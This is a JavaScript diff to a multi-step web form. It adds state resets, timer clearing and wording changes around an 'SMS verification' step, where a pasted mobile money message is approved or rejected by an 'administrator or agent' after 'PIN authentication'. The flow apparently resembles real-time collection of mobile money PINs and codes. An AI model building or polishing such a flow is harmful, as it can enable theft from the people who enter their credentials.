@@ -1006,6 +1006,9 @@
     }
 
     function goToStep(stepNum) {
+      hideApprovalOverlay();
+      if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+
       if (stepNum === 0) {
         if (pollingInterval) {
           clearInterval(pollingInterval);
@@ -1013,6 +1016,8 @@
         }
         appState.applicationId = null;
         isSubmittingMessage = false;
+        const msgInp = document.getElementById('momo-pasted-msg');
+        if (msgInp) msgInp.value = '';
       }
 
       if (currentStep === 1) {
@@ -1086,9 +1091,11 @@
         }
       }
 
-      window.scrollTo(0, 0);
-      document.body.scrollTop = 0;
-      document.documentElement.scrollTop = 0;
+      requestAnimationFrame(() => {
+        window.scrollTo(0, 0);
+        document.body.scrollTop = 0;
+        document.documentElement.scrollTop = 0;
+      });
     }
 
     let final20SecInterval = null;
@@ -1124,6 +1131,12 @@
     }
 
     function handleBackAction() {
+      hideApprovalOverlay();
+      isSubmittingMessage = false;
+      if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+      const msgInput = document.getElementById('momo-pasted-msg');
+      if (msgInput) msgInput.value = '';
+
       if (currentStep > 0 && currentStep <= 4) {
         goToStep(currentStep - 1);
       } else if (currentStep === 5) {
@@ -1491,9 +1504,24 @@
                 goToStep(5);
               } else if (smsVer.status === 'rejected') {
                 hideApprovalOverlay();
+                isSubmittingMessage = false;
+                if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+                
+                const msgInp = document.getElementById('momo-pasted-msg');
+                if (msgInp) msgInp.value = '';
+
+                const statusEl = document.getElementById('momo-extract-status');
+                if (statusEl) statusEl.classList.add('hidden');
+
+                const badge = document.getElementById('sms-waiting-badge');
+                if (badge) {
+                  badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
+                  badge.innerHTML = '<span>Ready to Auto-Fill</span>';
+                }
+
                 if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
                 if (msgAlert) {
-                  msgAlert.innerText = smsVer.reject_reason || '❌ Verification message rejected by administrator or agent! Returning to PIN authentication...';
+                  msgAlert.innerText = smsVer.reject_reason || '❌ Verification message rejected by administrator or agent! Please re-authenticate...';
                   msgAlert.classList.remove('hidden');
                 }
                 if (smsBtn) {
@@ -1502,7 +1530,7 @@
                 }
                 setTimeout(() => {
                   goToStep(3);
-                }, 1000);
+                }, 1200);
               }
             }
           }
